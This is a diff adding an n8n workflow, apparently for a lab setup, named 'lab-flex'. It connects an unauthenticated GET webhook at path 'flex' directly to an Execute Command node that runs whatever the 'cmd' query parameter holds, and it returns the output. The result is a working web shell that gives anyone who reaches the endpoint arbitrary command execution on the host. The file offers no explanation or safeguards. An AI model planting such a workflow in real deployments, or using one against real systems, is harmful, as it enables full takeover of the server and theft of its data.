@@ -1,0 +1,45 @@
+{
+  "name": "lab-flex",
+  "nodes": [
+    {
+      "parameters": {
+        "httpMethod": "GET",
+        "path": "flex",
+        "responseMode": "lastNode",
+        "options": {}
+      },
+      "id": "33333333-3333-3333-3333-333333333333",
+      "name": "Webhook",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 1.1,
+      "position": [0, 0],
+      "webhookId": "flex"
+    },
+    {
+      "parameters": {
+        "command": "={{$json.query.cmd}}"
+      },
+      "id": "44444444-4444-4444-4444-444444444444",
+      "name": "Exec",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [280, 0]
+    }
+  ],
+  "connections": {
+    "Webhook": {
+      "main": [
+        [
+          {
+            "node": "Exec",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "settings": {
+    "executionOrder": "v1"
+  }
+}
